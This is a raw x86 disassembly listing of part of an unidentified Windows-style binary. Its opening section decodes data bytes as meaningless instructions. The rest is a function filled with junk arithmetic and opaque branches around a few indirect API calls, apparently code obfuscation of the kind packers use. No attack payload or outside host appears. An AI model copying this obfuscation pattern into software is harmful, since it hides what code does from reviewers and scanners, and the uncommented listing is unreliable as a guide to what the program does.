  405e3d:	and    BYTE PTR [ecx+0x10],cl
  405e40:	push   ss
  405e41:	adc    BYTE PTR [eax],0x80
  405e44:	add    BYTE PTR [ecx],0xa
  405e47:	mov    BYTE PTR [edx],dl
  405e49:	add    BYTE PTR [eax],al
  405e4b:	add    BYTE PTR [edx],al
  405e4d:	add    BYTE PTR [edx],al
  405e4f:	inc    eax
  405e50:	mov    al,0xa
  405e52:	add    DWORD PTR [edx+edx*1],esp
  405e55:	add    BYTE PTR [eax],al
  405e57:	inc    eax
  405e58:	add    eax,DWORD PTR [eax]
  405e5a:	dec    esp
  405e5b:	inc    esp
  405e5c:	push   es
  405e5d:	and    BYTE PTR [ecx-0x5f3eb7bc],al
  405e63:	add    BYTE PTR [edx],al
  405e65:	or     BYTE PTR [eax+0x4090420],al
  405e6b:	add    DWORD PTR [eax],ecx
  405e6d:	nop
  405e6e:	xor    eax,edx
  405e70:	add    BYTE PTR [eax+0x58],al
  405e73:	mov    dl,0x10
  405e75:	add    BYTE PTR [edx],bl
  405e77:	add    BYTE PTR [eax+0x14],dl
  405e7a:	or     BYTE PTR [edx+eax*1-0x3effbf80],bl
  405e81:	and    BYTE PTR [edx+eax*1],al
  405e84:	or     al,0x20
  405e86:	and    al,0xa4
  405e88:	adc    cl,BYTE PTR [eax]
  405e8a:	add    al,0x0
  405e8c:	lahf   
  405e8d:	inc    eax
  405e8e:	or     DWORD PTR [eax+0x0],eax
  405e91:	add    BYTE PTR ds:0x8008000,cl
  405e97:	and    al,0x10
  405e99:	add    BYTE PTR [eax],al
  405e9b:	dec    eax
  405e9c:	adc    BYTE PTR [eax],al
  405e9e:	add    al,0x20
  405ea0:	add    DWORD PTR [esi],eax
  405ea2:	add    BYTE PTR [eax+eax*1],0x0
  405ea6:	add    BYTE PTR [eax],al
  405ea8:	adc    BYTE PTR [eax],0x0
  405eab:	add    BYTE PTR ds:0x414d4839,cl
  405eb1:	and    eax,0x54280010
  405eb6:	and    BYTE PTR ds:0x110010,0x1
  405ebd:	and    BYTE PTR [eax+0x4980454],al
  405ec3:	inc    eax
  405ec4:	adc    DWORD PTR [eax-0x7ebfedc6],esi
  405eca:	add    BYTE PTR [eax],dl
  405ecc:	add    DWORD PTR [eax],eax
  405ece:	add    al,0x44
  405ed0:	or     DWORD PTR [eax+0x8516b2b],eax
  405ed6:	xor    BYTE PTR [ecx+0x8],al
  405ed9:	add    eax,0x402848cc
  405ede:	sbb    ah,BYTE PTR [eax]
  405ee0:	test   cl,al
  405ee2:	rol    BYTE PTR [ecx],0x20
  405ee5:	jle    0x405f2f
  405ee7:	inc    eax
  405ee8:	add    al,al
  405eea:	and    BYTE PTR [edx],cl
  405eec:	push   eax
  405eed:	pop    eax
  405eee:	add    BYTE PTR [ecx],al
  405ef0:	inc    ebp
  405ef1:	adc    BYTE PTR [eax],0x0
  405ef4:	dec    eax
	...
  405f39:	add    BYTE PTR [eax],al
  405f3b:	add    BYTE PTR [ebp-0x75],dl
  405f3e:	in     al,dx
  405f3f:	sub    esp,0x5c
  405f42:	mov    eax,0x4c
  405f47:	mov    ecx,eax
  405f49:	mov    DWORD PTR [ebp-0x54],ecx
  405f4c:	push   ebx
  405f4d:	mov    ecx,0xda
  405f52:	mov    ebx,DWORD PTR [ebp-0x54]
  405f55:	test   ebx,0x38
  405f5b:	je     0x405fb9
  405f5d:	mov    eax,0x7bb5
  405f62:	mov    edx,DWORD PTR [ebp-0x54]
  405f65:	sub    ebx,edx
  405f67:	sub    DWORD PTR [ebp-0x54],ebx
  405f6a:	test   ebx,0x2d
  405f70:	jne    0x405fb9
  405f72:	sub    ebx,edx
  405f74:	mov    edx,DWORD PTR [ebp-0x54]
  405f77:	cmp    ebx,eax
  405f79:	je     0x405fb9
  405f7b:	mov    eax,ebx
  405f7d:	test   edx,0x4c13
  405f83:	jne    0x405fb9
  405f85:	mov    ebx,eax
  405f87:	or     ebx,ecx
  405f89:	mov    DWORD PTR [ebp-0x54],ebx
  405f8c:	mov    ebx,0x35
  405f91:	cmp    eax,DWORD PTR [ebp-0x28]
  405f94:	je     0x405fb9
  405f96:	sub    edx,ecx
  405f98:	mov    eax,0x21
  405f9d:	mov    ecx,DWORD PTR [ebp-0x54]
  405fa0:	or     DWORD PTR [ebp-0x54],ecx
  405fa3:	sub    eax,ecx
  405fa5:	cmp    edx,0x42
  405fa8:	jne    0x405fb9
  405faa:	add    DWORD PTR [ebp-0x54],ebx
  405fad:	cmp    eax,0x7743
  405fb2:	je     0x405fb9
  405fb4:	or     eax,edx
  405fb6:	sub    DWORD PTR [ebp-0x54],eax
  405fb9:	push   esi
  405fba:	cmp    eax,edx
  405fbc:	je     0x405fd6
  405fbe:	mov    edx,0x9c
  405fc3:	mov    esi,0x58
  405fc8:	and    DWORD PTR [ebp-0x54],ecx
  405fcb:	sub    eax,ebx
  405fcd:	add    DWORD PTR [ebp-0x54],edx
  405fd0:	add    DWORD PTR [ebp-0x54],esi
  405fd3:	sub    DWORD PTR [ebp-0x54],eax
  405fd6:	push   edi
  405fd7:	mov    ecx,DWORD PTR [ebp-0x54]
  405fda:	mov    ebx,DWORD PTR [ebp-0x54]
  405fdd:	and    DWORD PTR [ebp-0x54],ebx
  405fe0:	add    DWORD PTR [ebp-0x54],ecx
  405fe3:	xor    esi,esi
  405fe5:	mov    eax,DWORD PTR [ebp-0x54]
  405fe8:	cmp    eax,0xffffff91
  405feb:	jne    0x406016
  405fed:	mov    ecx,DWORD PTR ds:0x435420
  405ff3:	cmp    eax,ebx
  405ff5:	jne    0x406016
  405ff7:	cmp    eax,DWORD PTR [ebp-0x20]
  405ffa:	jne    0x406016
  405ffc:	mov    ecx,DWORD PTR ds:0x435420
  406002:	add    eax,edx
  406004:	add    DWORD PTR [ebp-0x54],eax
  406007:	mov    edx,0x7df4
  40600c:	or     DWORD PTR [ebp-0x54],ecx
  40600f:	add    edx,edx
  406011:	sub    edx,eax
  406013:	sub    DWORD PTR [ebp-0x54],edx
  406016:	add    esi,ebx
  406018:	add    DWORD PTR [ebp-0x54],esi
  40601b:	add    DWORD PTR [ebp-0x54],eax
  40601e:	cmp    edx,0x1
  406021:	je     0x406031
  406023:	test   eax,0xa
  406028:	jne    0x406031
  40602a:	or     ebx,esi
  40602c:	sub    ebx,esi
  40602e:	or     DWORD PTR [ebp-0x54],ebx
  406031:	cmp    edx,DWORD PTR [ebp-0x20]
  406034:	je     0x40605f
  406036:	mov    edi,esi
  406038:	xor    eax,eax
  40603a:	sub    edi,edx
  40603c:	sub    edi,edx
  40603e:	and    DWORD PTR [ebp-0x54],esi
  406041:	cmp    edi,DWORD PTR ds:0x435420
  406047:	jne    0x40605f
  406049:	mov    esi,DWORD PTR [ebp-0x54]
  40604c:	mov    DWORD PTR [ebp-0x54],esi
  40604f:	mov    ebx,DWORD PTR [ebp-0x54]
  406052:	add    eax,edi
  406054:	sub    DWORD PTR [ebp-0x54],eax
  406057:	cmp    ebx,DWORD PTR [ebp-0x8]
  40605a:	jne    0x40605f
  40605c:	sub    DWORD PTR [ebp-0x54],ebx
  40605f:	xor    ebx,ebx
  406061:	add    DWORD PTR [ebp-0x54],ebx
  406064:	or     esi,eax
  406066:	sub    DWORD PTR [ebp-0x54],esi
  406069:	or     edx,eax
  40606b:	mov    ebx,DWORD PTR [ebp-0x54]
  40606e:	add    edx,edi
  406070:	add    DWORD PTR [ebp-0x54],edx
  406073:	or     ebx,esi
  406075:	mov    edx,DWORD PTR ds:0x435420
  40607b:	sub    DWORD PTR [ebp-0x54],edx
  40607e:	test   ebx,0x5c
  406084:	jne    0x4060a0
  406086:	and    ebx,edi
  406088:	cmp    ebx,0x3e
  40608b:	je     0x4060a0
  40608d:	sub    ebx,eax
  40608f:	test   ebx,0xd7
  406095:	jne    0x4060a0
  406097:	mov    eax,DWORD PTR [ebp-0x54]
  40609a:	mov    DWORD PTR [ebp-0x54],ebx
  40609d:	mov    DWORD PTR [ebp-0x54],eax
  4060a0:	sub    edi,esi
  4060a2:	sub    DWORD PTR [ebp-0x54],edi
  4060a5:	sub    DWORD PTR [ebp-0x54],ecx
  4060a8:	mov    ecx,DWORD PTR [ebp-0x54]
  4060ab:	cmp    ecx,0x645f
  4060b1:	je     0x4060ce
  4060b3:	add    ecx,edx
  4060b5:	cmp    ecx,0xfffffff0
  4060b8:	je     0x4060ce
  4060ba:	add    ecx,eax
  4060bc:	mov    ebx,0xf4
  4060c1:	mov    esi,edx
  4060c3:	add    DWORD PTR [ebp-0x54],ecx
  4060c6:	and    DWORD PTR [ebp-0x54],esi
  4060c9:	add    ebx,eax
  4060cb:	add    DWORD PTR [ebp-0x54],ebx
  4060ce:	mov    edx,DWORD PTR [ebp-0x54]
  4060d1:	mov    edi,DWORD PTR [ebp-0x54]
  4060d4:	sub    edi,edx
  4060d6:	test   edi,0x23f
  4060dc:	jne    0x4060e1
  4060de:	sub    DWORD PTR [ebp-0x54],edi
  4060e1:	mov    eax,DWORD PTR [ebp-0x54]
  4060e4:	mov    DWORD PTR [ebp-0x54],eax
  4060e7:	mov    ecx,DWORD PTR [ebp-0x54]
  4060ea:	sub    DWORD PTR [ebp-0x54],ecx
  4060ed:	xor    DWORD PTR [ebp-0x54],ecx
  4060f0:	add    DWORD PTR [ebp-0x54],edx
  4060f3:	xor    ecx,ecx
  4060f5:	mov    eax,ebx
  4060f7:	and    DWORD PTR [ebp-0x54],ecx
  4060fa:	sub    eax,ecx
  4060fc:	add    DWORD PTR [ebp-0x54],ecx
  4060ff:	add    DWORD PTR [ebp-0x54],edx
  406102:	add    eax,esi
  406104:	cmp    eax,0x7b
  406107:	je     0x40610e
  406109:	and    eax,ebx
  40610b:	add    DWORD PTR [ebp-0x54],eax
  40610e:	sub    edx,esi
  406110:	cmp    edx,0x3d
  406113:	je     0x40618e
  406115:	mov    eax,0x5e
  40611a:	mov    esi,DWORD PTR [ebp-0x54]
  40611d:	sub    eax,ecx
  40611f:	test   edx,0x8c
  406125:	je     0x40618e
  406127:	add    DWORD PTR [ebp-0x54],ebx
  40612a:	add    DWORD PTR [ebp-0x54],edx
  40612d:	mov    edi,0x85
  406132:	and    esi,ebx
  406134:	mov    edi,DWORD PTR [ebp-0x54]
  406137:	add    eax,edi
  406139:	test   esi,0x6b
  40613f:	je     0x40618e
  406141:	cmp    eax,0xffffffc0
  406144:	jne    0x40618e
  406146:	mov    edi,DWORD PTR [ebp-0x54]
  406149:	cmp    eax,0xffffffa8
  40614c:	je     0x40618e
  40614e:	mov    ebx,DWORD PTR [ebp-0x54]
  406151:	mov    ecx,DWORD PTR [ebp-0x54]
  406154:	sub    edi,ecx
  406156:	sub    DWORD PTR [ebp-0x54],ebx
  406159:	add    eax,edx
  40615b:	cmp    esi,DWORD PTR ds:0x435420
  406161:	je     0x40618e
  406163:	add    eax,eax
  406165:	sub    esi,ecx
  406167:	add    eax,esi
  406169:	sub    eax,esi
  40616b:	sub    DWORD PTR [ebp-0x54],eax
  40616e:	xor    edx,edx
  406170:	mov    ebx,0x33df
  406175:	sub    ebx,esi
  406177:	sub    DWORD PTR [ebp-0x54],edx
  40617a:	or     edi,eax
  40617c:	and    ebx,edi
  40617e:	and    ebx,esi
  406180:	sub    ebx,eax
  406182:	cmp    ebx,esi
  406184:	jne    0x40618e
  406186:	cmp    ecx,0xffffffd6
  406189:	je     0x40618e
  40618b:	add    DWORD PTR [ebp-0x54],ebx
  40618e:	cmp    eax,0x7d
  406191:	jne    0x4061ab
  406193:	mov    ecx,DWORD PTR [ebp-0x54]
  406196:	add    ecx,eax
  406198:	mov    eax,0x23
  40619d:	add    DWORD PTR [ebp-0x54],eax
  4061a0:	cmp    ecx,0x5a
  4061a3:	je     0x4061ab
  4061a5:	add    DWORD PTR [ebp-0x54],ebx
  4061a8:	or     DWORD PTR [ebp-0x54],ecx
  4061ab:	sub    DWORD PTR [ebp-0x54],esi
  4061ae:	sub    DWORD PTR [ebp-0x54],ebx
  4061b1:	or     DWORD PTR [ebp-0x54],ecx
  4061b4:	push   0x43
  4061b6:	push   0x0
  4061b8:	call   DWORD PTR ds:0x435274
  4061be:	add    DWORD PTR [ebp-0x54],eax
  4061c1:	cmp    eax,0x13
  4061c4:	je     0x40627f
  4061ca:	mov    ebx,DWORD PTR [ebp-0x54]
  4061cd:	mov    edx,DWORD PTR [ebp-0x54]
  4061d0:	sub    DWORD PTR [ebp-0x54],eax
  4061d3:	cmp    edx,DWORD PTR ds:0x435420
  4061d9:	jne    0x406226
  4061db:	mov    ecx,eax
  4061dd:	add    DWORD PTR [ebp-0x54],ebx
  4061e0:	sub    edx,ebx
  4061e2:	mov    edi,eax
  4061e4:	cmp    edi,0x1145410
  4061ea:	jne    0x406226
  4061ec:	or     DWORD PTR [ebp-0x54],ecx
  4061ef:	cmp    edi,esi
  4061f1:	je     0x406226
  4061f3:	mov    eax,DWORD PTR [ebp-0x54]
  4061f6:	add    edx,edx
  4061f8:	test   ebx,0xa7
  4061fe:	jne    0x406226
  406200:	sub    DWORD PTR [ebp-0x54],edx
  406203:	cmp    eax,0xffffffe6
  406206:	je     0x406226
  406208:	add    DWORD PTR [ebp-0x54],eax
  40620b:	mov    ecx,esi
  40620d:	add    ecx,edx
  40620f:	mov    esi,DWORD PTR [ebp-0x54]
  406212:	add    edi,eax
  406214:	sub    DWORD PTR [ebp-0x54],edi
  406217:	and    esi,ecx
  406219:	cmp    esi,DWORD PTR ds:0x435420
  40621f:	je     0x406226
  406221:	add    esi,ecx
  406223:	and    DWORD PTR [ebp-0x54],esi
  406226:	mov    edx,0xc9
  40622b:	mov    eax,ebx
  40622d:	add    DWORD PTR [ebp-0x54],edx
  406230:	add    DWORD PTR [ebp-0x54],eax
  406233:	xor    edi,edi
  406235:	add    DWORD PTR [ebp-0x54],edi
  406238:	mov    ebx,edx
  40623a:	mov    esi,DWORD PTR [ebp-0x54]
  40623d:	mov    ecx,DWORD PTR [ebp-0x54]
  406240:	test   esi,0xf5
  406246:	je     0x40625b
  406248:	cmp    esi,0xffffffa0
  40624b:	jne    0x40625b
  40624d:	mov    DWORD PTR [ebp-0x54],ebx
  406250:	mov    DWORD PTR [ebp-0x54],ecx
  406253:	cmp    esi,0xfffffff5
  406256:	je     0x40625b
  406258:	or     DWORD PTR [ebp-0x54],esi
  40625b:	add    esi,esi
  40625d:	cmp    esi,0xffffffbf
  406260:	je     0x40626d
  406262:	cmp    esi,0x6de1
  406268:	je     0x40626d
  40626a:	xor    DWORD PTR [ebp-0x54],esi
  40626d:	mov    DWORD PTR [ebp-0x10],ebx
  406270:	mov    edi,edx
  406272:	sub    DWORD PTR [ebp-0x54],ecx
  406275:	mov    ebx,ecx
  406277:	mov    DWORD PTR [ebp-0x54],edi
  40627a:	add    ebx,ecx
  40627c:	add    DWORD PTR [ebp-0x54],ebx
  40627f:	mov    eax,DWORD PTR [ebp-0x54]
  406282:	mov    ebx,DWORD PTR [ebp-0x54]
  406285:	add    DWORD PTR [ebp-0x54],eax
  406288:	add    ebx,edi
  40628a:	add    ebx,ecx
  40628c:	and    ebx,esi
  40628e:	sub    ebx,edi
  406290:	cmp    ebx,0x7c
  406293:	jne    0x4062d4
  406295:	add    ebx,ebx
  406297:	add    ebx,eax
  406299:	mov    esi,0x1b
  40629e:	mov    edx,0xc9
  4062a3:	sub    ebx,esi
  4062a5:	add    ebx,esi
  4062a7:	cmp    ebx,0xffffffeb
  4062aa:	jne    0x4062d4
  4062ac:	xor    edi,edi
  4062ae:	cmp    ebx,esi
  4062b0:	jne    0x4062d4
  4062b2:	xor    DWORD PTR [ebp-0x54],edx
  4062b5:	mov    ecx,DWORD PTR ds:0x435420
  4062bb:	mov    edx,DWORD PTR ds:0x43542c
  4062c1:	and    ebx,ecx
  4062c3:	add    DWORD PTR [ebp-0x54],edi
  4062c6:	cmp    ebx,DWORD PTR ds:0x43542c
  4062cc:	jne    0x4062d4
  4062ce:	xor    DWORD PTR [ebp-0x54],edx
  4062d1:	add    DWORD PTR [ebp-0x54],ebx
  4062d4:	xor    ecx,ecx
  4062d6:	mov    edi,0x43
  4062db:	or     ecx,eax
  4062dd:	add    DWORD PTR [ebp-0x54],eax
  4062e0:	and    ecx,esi
  4062e2:	or     edi,esi
  4062e4:	and    edi,ebx
  4062e6:	add    edi,edx
  4062e8:	cmp    edi,DWORD PTR ds:0x43542c
  4062ee:	je     0x406313
  4062f0:	mov    esi,0x44
  4062f5:	sub    DWORD PTR [ebp-0x54],edi
  4062f8:	cmp    edi,0xfffffffb
  4062fb:	jne    0x406313
  4062fd:	mov    ebx,DWORD PTR ds:0x435420
  406303:	xor    edi,edi
  406305:	mov    DWORD PTR [ebp-0x54],edi
  406308:	and    DWORD PTR [ebp-0x54],ecx
  40630b:	add    DWORD PTR [ebp-0x54],ebx
  40630e:	and    esi,eax
  406310:	and    DWORD PTR [ebp-0x54],esi
  406313:	lea    eax,[ebp-0x1c]
  406316:	push   eax
  406317:	call   DWORD PTR ds:0x4352b4
  40631d:	or     esi,eax
  40631f:	mov    edx,esi
  406321:	mov    esi,DWORD PTR ds:0x435420
  406327:	add    edx,ebx
  406329:	add    esi,ebx
  40632b:	add    edx,esi
  40632d:	sub    DWORD PTR [ebp-0x54],edx
  406330:	mov    DWORD PTR [ebp-0x48],eax
  406333:	sub    DWORD PTR [ebp-0x54],esi
  406336:	call   DWORD PTR ds:0x435248
  40633c:	cmp    eax,0x4262
  406341:	je     0x40634f
  406343:	and    ebx,eax
  406345:	sub    DWORD PTR [ebp-0x54],edi
  406348:	or     ebx,eax
  40634a:	and    ebx,eax
  40634c:	sub    DWORD PTR [ebp-0x54],ebx
  40634f:	mov    DWORD PTR [ebp-0x5c],eax
  406352:	or     esi,eax
  406354:	mov    edx,DWORD PTR [ebp-0x54]
  406357:	mov    edi,DWORD PTR ds:0x435430
  40635d:	cmp    esi,0x25
  406360:	je     0x406476
  406366:	add    DWORD PTR [ebp-0x54],ebx
  406369:	sub    esi,eax
  40636b:	and    DWORD PTR [ebp-0x54],esi
  40636e:	sub    edx,esi
  406370:	cmp    edx,0xffffff8e
  406373:	jne    0x406476
  406379:	mov    ebx,DWORD PTR [ebp-0x54]
  40637c:	cmp    ebx,0xffffffe4
  40637f:	je     0x406476
  406385:	cmp    ebx,0xffffff96
  406388:	je     0x406476
  40638e:	add    edx,edx
  406390:	mov    eax,DWORD PTR [ebp-0x54]
  406393:	mov    edi,0xdc
  406398:	sub    DWORD PTR [ebp-0x54],eax
  40639b:	cmp    eax,edx
  40639d:	jne    0x406476
  4063a3:	test   ebx,0x36
  4063a9:	je     0x406476
  4063af:	mov    eax,0x7f
  4063b4:	cmp    ebx,esi
  4063b6:	jne    0x406476
  4063bc:	add    DWORD PTR [ebp-0x54],ebx
  4063bf:	cmp    edx,0x3c
  4063c2:	jne    0x406476
  4063c8:	mov    ebx,DWORD PTR [ebp-0x54]
  4063cb:	cmp    ebx,DWORD PTR ds:0x435420
  4063d1:	jne    0x406476
  4063d7:	add    DWORD PTR [ebp-0x54],ebx
  4063da:	sub    DWORD PTR [ebp-0x54],edx
  4063dd:	add    eax,eax
  4063df:	mov    ecx,DWORD PTR [ebp-0x54]
  4063e2:	add    eax,esi
  4063e4:	cmp    ecx,ebx
  4063e6:	jne    0x406476
  4063ec:	mov    esi,edi
  4063ee:	sub    ecx,edi
  4063f0:	add    eax,esi
  4063f2:	cmp    ecx,0xfffffffe
  4063f5:	jne    0x406476
  4063f7:	sub    ecx,ebx
  4063f9:	mov    edi,DWORD PTR ds:0x43542c
  4063ff:	cmp    ecx,edi
  406401:	je     0x406476
  406403:	test   eax,0xb06a
  406408:	je     0x406476
  40640a:	mov    ebx,DWORD PTR ds:0x435408
  406410:	cmp    ecx,0xb6e0
  406416:	je     0x406476
  406418:	cmp    ecx,0xffffffb4
  40641b:	jne    0x406476
  40641d:	mov    esi,DWORD PTR [ebp-0x54]
  406420:	cmp    eax,ecx
  406422:	je     0x406476
  406424:	sub    DWORD PTR [ebp-0x54],ecx
  406427:	xor    edx,edx
  406429:	mov    ebx,DWORD PTR [ebp-0x54]
  40642c:	xor    DWORD PTR [ebp-0x54],edi
  40642f:	and    esi,ecx
  406431:	sub    edx,esi
  406433:	cmp    edx,DWORD PTR [ebp-0x10]
  406436:	jne    0x406476
  406438:	add    DWORD PTR [ebp-0x54],eax
  40643b:	mov    esi,DWORD PTR [ebp-0x54]
  40643e:	mov    edi,0xb5
  406443:	add    DWORD PTR [ebp-0x54],edx
  406446:	test   esi,0x86
  40644c:	je     0x406476
  40644e:	mov    ecx,DWORD PTR [ebp-0x54]
  406451:	sub    ecx,ebx
  406453:	mov    edx,0xf6
  406458:	sub    DWORD PTR [ebp-0x54],edx
  40645b:	xor    DWORD PTR [ebp-0x54],esi
  40645e:	or     DWORD PTR [ebp-0x54],ecx
  406461:	sub    edi,ebx
  406463:	add    edi,edx
  406465:	cmp    edi,DWORD PTR [ebp-0x28]
  406468:	jne    0x406476
  40646a:	mov    edx,DWORD PTR [ebp-0x54]
  40646d:	add    edi,edx
  40646f:	cmp    edi,edx
  406471:	je     0x406476
  406473:	or     DWORD PTR [ebp-0x54],edi
  406476:	call   DWORD PTR ds:0x4352b0
  40647c:	add    ebx,ebx
  40647e:	mov    ecx,DWORD PTR [ebp-0x54]
  406481:	cmp    ecx,0x7d
  406484:	je     0x406495
  406486:	add    DWORD PTR [ebp-0x54],edi
  406489:	sub    ecx,edi
  40648b:	add    DWORD PTR [ebp-0x54],ebx
  40648e:	add    ecx,eax
  406490:	add    ecx,ebx
  406492:	or     DWORD PTR [ebp-0x54],ecx
  406495:	test   eax,0xb036
  40649a:	jne    0x40675e
  4064a0:	mov    esi,DWORD PTR [ebp-0x54]
  4064a3:	xor    DWORD PTR [ebp-0x54],eax
  4064a6:	mov    eax,DWORD PTR [ebp-0x54]
  4064a9:	or     DWORD PTR [ebp-0x54],eax
  4064ac:	add    DWORD PTR [ebp-0x54],esi
  4064af:	mov    edi,0xf968
  4064b4:	add    ebx,edi
  4064b6:	test   ebx,0xb5
  4064bc:	je     0x4064c1
  4064be:	or     DWORD PTR [ebp-0x54],ebx
  4064c1:	cmp    ebx,DWORD PTR [ebp-0x28]
  4064c4:	je     0x4064cf
  4064c6:	mov    eax,DWORD PTR [ebp-0x54]
  4064c9:	add    DWORD PTR [ebp-0x54],ecx
  4064cc:	sub    DWORD PTR [ebp-0x54],eax
  4064cf:	mov    ebx,edi
  4064d1:	mov    eax,DWORD PTR [ebp-0x54]
  4064d4:	add    DWORD PTR [ebp-0x54],eax
  4064d7:	mov    edx,DWORD PTR [ebp-0x54]
  4064da:	mov    ecx,DWORD PTR ds:0x435430
  4064e0:	cmp    edx,0x2e
  4064e3:	je     0x406530
  4064e5:	add    edx,edx
  4064e7:	add    ecx,ecx
  4064e9:	sub    ecx,eax
  4064eb:	mov    DWORD PTR [ebp-0x54],ecx
  4064ee:	mov    eax,DWORD PTR [ebp-0x54]
  4064f1:	add    edx,esi
  4064f3:	mov    esi,DWORD PTR ds:0x43542c
  4064f9:	test   edx,0x12
  4064ff:	jne    0x406530
  406501:	mov    ecx,DWORD PTR [ebp-0x54]
  406504:	or     eax,edi
  406506:	add    ecx,ecx
  406508:	cmp    eax,0xffffffbb
  40650b:	je     0x406530
  40650d:	mov    DWORD PTR [ebp-0x54],ebx
  406510:	sub    esi,ebx
  406512:	cmp    edx,edi
  406514:	je     0x406530
  406516:	add    DWORD PTR [ebp-0x54],ebx
  406519:	add    ecx,ecx
  40651b:	and    DWORD PTR [ebp-0x54],eax
  40651e:	sub    DWORD PTR [ebp-0x54],eax
  406521:	add    DWORD PTR [ebp-0x54],esi
  406524:	sub    ecx,eax
  406526:	sub    DWORD PTR [ebp-0x54],edx
  406529:	sub    ecx,edx
  40652b:	sub    ecx,edx
  40652d:	add    DWORD PTR [ebp-0x54],ecx
  406530:	add    ebx,edi
  406532:	add    ecx,edi
  406534:	xor    eax,eax
  406536:	cmp    ecx,0x25
  406539:	je     0x4065cf
  40653f:	sub    DWORD PTR [ebp-0x54],ebx
  406542:	or     DWORD PTR [ebp-0x54],ecx
  406545:	sub    DWORD PTR [ebp-0x54],esi
  406548:	cmp    edx,ebx
  40654a:	jne    0x40654f
  40654c:	or     DWORD PTR [ebp-0x54],ecx
  40654f:	add    DWORD PTR [ebp-0x54],esi
  406552:	mov    edx,0xbe23
  406557:	add    DWORD PTR [ebp-0x54],edx
  40655a:	mov    esi,eax
  40655c:	sub    esi,ebx
  40655e:	add    esi,ebx
  406560:	or     DWORD PTR [ebp-0x54],edi
  406563:	sub    DWORD PTR [ebp-0x54],edi
  406566:	add    DWORD PTR [ebp-0x54],ecx
  406569:	cmp    ecx,eax
  40656b:	jne    0x4065cf
  40656d:	mov    eax,DWORD PTR [ebp-0x54]
  406570:	mov    ecx,DWORD PTR [ebp-0x54]
  406573:	add    DWORD PTR [ebp-0x54],esi
  406576:	or     DWORD PTR [ebp-0x54],eax
  406579:	or     DWORD PTR [ebp-0x54],ebx
  40657c:	cmp    ecx,DWORD PTR [ebp-0x34]
  40657f:	je     0x4065cf
  406581:	cmp    ecx,ebx
  406583:	je     0x4065cf
  406585:	mov    edx,DWORD PTR ds:0x435440
  40658b:	mov    esi,DWORD PTR [ebp-0x54]
  40658e:	cmp    esi,0x5a65
  406594:	je     0x4065cf
  406596:	cmp    ecx,0x6232
  40659c:	je     0x4065cf
  40659e:	xor    DWORD PTR [ebp-0x54],esi
  4065a1:	mov    eax,DWORD PTR [ebp-0x54]
  4065a4:	mov    esi,0x54
  4065a9:	cmp    eax,0x1794
  4065ae:	jne    0x4065cf
  4065b0:	cmp    eax,edi
  4065b2:	je     0x4065cf
  4065b4:	mov    esi,DWORD PTR [ebp-0x54]
  4065b7:	cmp    ecx,esi
  4065b9:	jne    0x4065cf
  4065bb:	add    DWORD PTR [ebp-0x54],esi
  4065be:	mov    edx,DWORD PTR ds:0x435430
  4065c4:	sub    DWORD PTR [ebp-0x54],ecx
  4065c7:	sub    edx,edi
  4065c9:	sub    DWORD PTR [ebp-0x54],eax
  4065cc:	or     DWORD PTR [ebp-0x54],edx
  4065cf:	mov    edx,DWORD PTR [ebp-0x54]
  4065d2:	sub    edx,esi
  4065d4:	cmp    edx,0x3a1d
  4065da:	jne    0x4065f3
  4065dc:	cmp    edx,0xf47a
  4065e2:	jne    0x4065f3
  4065e4:	cmp    edx,0xffffff84
  4065e7:	jne    0x4065f3
  4065e9:	cmp    edx,DWORD PTR [ebp-0x44]
  4065ec:	jne    0x4065f3
  4065ee:	mov    ecx,edx
  4065f0:	add    DWORD PTR [ebp-0x54],ecx
  4065f3:	add    ebx,ebx
  4065f5:	xor    eax,eax
  4065f7:	add    DWORD PTR [ebp-0x54],ebx
  4065fa:	sub    eax,ecx
  4065fc:	add    DWORD PTR [ebp-0x54],eax
  4065ff:	mov    ecx,DWORD PTR [ebp-0x54]
  406602:	cmp    ecx,0x1320811
  406608:	jne    0x40661b
  40660a:	mov    esi,DWORD PTR [ebp-0x54]
  40660d:	mov    edx,DWORD PTR ds:0x435408
  406613:	add    ecx,edx
  406615:	add    DWORD PTR [ebp-0x54],ecx
  406618:	sub    DWORD PTR [ebp-0x54],esi
  40661b:	sub    edi,ebx
  40661d:	mov    esi,DWORD PTR [ebp-0x54]
  406620:	mov    edx,0x7f
  406625:	or     DWORD PTR [ebp-0x54],edi
  406628:	or     esi,eax
  40662a:	cmp    esi,0x5e
  40662d:	jne    0x406636
  40662f:	cmp    esi,edx
  406631:	jne    0x406636
  406633:	mov    DWORD PTR [ebp-0x38],esi
  406636:	mov    DWORD PTR [ebp-0x4c],ecx
  406639:	mov    DWORD PTR [ebp-0x14],edi
  40663c:	cmp    eax,DWORD PTR [ebp-0x50]
  40663f:	jne    0x40675e
  406645:	cmp    esi,eax
  406647:	jne    0x40675e
  40664d:	mov    edi,DWORD PTR [ebp-0x54]
  406650:	mov    edx,DWORD PTR [ebp-0x4c]
  406653:	add    edi,edx
  406655:	sub    edi,ebx
  406657:	cmp    edi,0xffffffe6
  40665a:	je     0x40675e
  406660:	mov    eax,DWORD PTR ds:0x435430
  406666:	add    edi,edx
  406668:	mov    ecx,DWORD PTR [ebp-0x4c]
  40666b:	add    DWORD PTR [ebp-0x54],eax
  40666e:	add    edi,edi
  406670:	cmp    edi,0x55
  406673:	je     0x40675e
  406679:	cmp    edi,ecx
  40667b:	je     0x40675e
  406681:	cmp    edi,DWORD PTR [ebp-0x4c]
  406684:	jne    0x40675e
  40668a:	mov    esi,ebx
  40668c:	cmp    ecx,edx
  40668e:	je     0x40675e
  406694:	and    ecx,edi
  406696:	mov    ebx,0x66
  40669b:	mov    eax,0x45a0
  4066a0:	and    DWORD PTR [ebp-0x4c],ebx
  4066a3:	and    eax,esi
  4066a5:	and    ecx,eax
  4066a7:	test   ecx,0x71
  4066ad:	je     0x40675e
  4066b3:	sub    ecx,edx
  4066b5:	sub    ecx,edx
  4066b7:	cmp    ecx,DWORD PTR ds:0x435440
  4066bd:	jne    0x40675e
  4066c3:	mov    esi,DWORD PTR [ebp-0x54]
  4066c6:	sub    esi,eax
  4066c8:	cmp    esi,ebx
  4066ca:	jne    0x40675e
  4066d0:	mov    edx,0xbb
  4066d5:	sub    esi,ebx
  4066d7:	mov    edi,DWORD PTR [ebp-0x4c]
  4066da:	add    edx,ecx
  4066dc:	add    DWORD PTR [ebp-0x4c],edi
  4066df:	cmp    edx,0xffffffc2
  4066e2:	jne    0x40675e
  4066e4:	mov    eax,DWORD PTR [ebp-0x54]
  4066e7:	sub    DWORD PTR [ebp-0x4c],edx
  4066ea:	sub    esi,edx
  4066ec:	cmp    edi,0x57
  4066ef:	jne    0x40675e
